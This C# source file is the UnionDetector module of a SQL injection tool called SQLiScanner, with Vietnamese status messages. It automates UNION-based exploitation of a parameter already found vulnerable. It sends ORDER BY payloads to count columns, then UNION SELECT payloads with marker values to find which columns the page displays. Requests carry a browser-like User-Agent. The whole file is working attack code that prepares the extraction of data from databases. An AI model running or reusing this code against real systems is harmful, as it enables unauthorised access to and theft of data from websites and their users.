using SQLiScanner.Models;
using SQLiScanner.Models.Enums;
using SQLiScanner.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

namespace SQLiScanner.Modules
{
    public class UnionDetector
    {
        private readonly HttpClient _client;
        public UnionDetector(HttpClient client)
        {
            _client = client;
        }

        public async Task<int> GetColumnCountAsync(
            CrawlResult target, 
            DetectionResult detectedData, 
            PayloadState trackingState,
            CancellationToken cancellationToken = default)
        {
            trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, "Đang dò số cột bằng ORDER BY...");

            string originalValue = target.Params.TryGetValue(detectedData.VulnerableParam, out var bodyVal)
                ? bodyVal
                : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[detectedData.VulnerableParam] ?? "");

            int baseLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, originalValue, cancellationToken);

            if (baseLength <= 0) return -1;

            for (int i = 1; i <= 50; i++)
            {
                string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{detectedData.WorkingSuffix}";
                int currentLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, payload, cancellationToken);

                bool isError = Math.Abs(currentLength - baseLength) > baseLength * 0.2;

                if (isError)
                {
                    if (i == 1) return -1;
                    return i - 1;
                }
                else
                {
                    trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, $"Đang dò cột thứ {i}...");
                }
            }

            return -1;
        }

        public async Task<List<int>> GetVisibleColumnsAsync(
            CrawlResult target, 
            DetectionResult detectedData, 
            int colCount,
            PayloadState trackingState,
            CancellationToken cancellationToken = default)
        {
            trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang tìm cột Text trong {colCount} cột...");
            List<int> visibleCols = new List<int>();
            string fromTable = detectedData.DatabaseType == DatabaseType.Oracle ? " FROM DUAL" : "";

            string originalValue = target.Params.TryGetValue(detectedData.VulnerableParam, out var bodyVal)
                ? bodyVal
                : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[detectedData.VulnerableParam] ?? "");

            string[] payloadParts = new string[colCount];
            for (int i = 0; i < colCount; i++)
            {
                trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang thử inject cột {i + 1}/{colCount}...");
                for (int j = 0; j < colCount; j++) payloadParts[j] = "NULL";

                string magicTag = $"99{i + 1:D2}"; // VD: 9901
                payloadParts[i] = $"'{magicTag}'";

                string unionPart = string.Join(",", payloadParts);
                string payload = $"{originalValue}{detectedData.WorkingPrefix} AND 1=0 UNION SELECT {unionPart}{fromTable}{detectedData.WorkingSuffix}";

                try
                {
                    // Ở đây ta cần HTML string để tìm text '9901'
                    string? html = await SendPayloadGetStringAsync(target, detectedData.VulnerableParam, payload, cancellationToken);

                    if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                    {
                        visibleCols.Add(i + 1);
                    }
                }
                catch {}
            }

            return visibleCols;
        }

        #region Các hàm phụ trợ
        private async Task<int> GetResponseLengthAsync(
            CrawlResult target, string paramKey, string payloadValue, CancellationToken cancellationToken = default)
        {
            try
            {
                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue, cancellationToken);
                return bytes == null ? -1 : bytes.Length;
            }
            catch { return -1; }
        }

        private async Task<byte[]?> SendPayloadGetBytesAsync(
            CrawlResult target, string injectKey, string injectValue, CancellationToken cancellationToken = default)
        {
            try
            {
                var method = new HttpMethod(target.HttpMethod.ToUpper());
                HttpRequestMessage request;

                var queryParams = System.Web.HttpUtility.ParseQueryString(target.RawQueryString);
                var bodyParams = new Dictionary<string, string>(target.Params);

                bool isQueryParam = target.RawQueryString.Contains($"{injectKey}=") || !target.Params.ContainsKey(injectKey);

                if (isQueryParam)
                {
                    queryParams[injectKey] = injectValue;
                    bodyParams.Remove(injectKey);
                }
                else
                {
                    bodyParams[injectKey] = injectValue; 
                }

                var uriBuilder = new UriBuilder(target.BaseUrl);
                uriBuilder.Query = queryParams.ToString();

                request = new HttpRequestMessage(method, uriBuilder.ToString());

                if (method == HttpMethod.Post)
                {
                    request.Content = new FormUrlEncodedContent(bodyParams);
                }


                if (!request.Headers.Contains("User-Agent"))
                {
                    request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                }

                using var response = await _client.SendAsync(request, HttpCompletionOption.ResponseContentRead);

                var bytes = await response.Content.ReadAsByteArrayAsync();

                return bytes;
            }
            catch 
            {
                return null;
            }
        }

        private async Task<string?> SendPayloadGetStringAsync(
            CrawlResult target, string paramKey, string payloadValue, CancellationToken cancellationToken = default)
        {
            try
            {
                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue, cancellationToken);
                return bytes == null ? "" : System.Text.Encoding.UTF8.GetString(bytes);
            }
            catch { return ""; }
        }
        #endregion
    }
}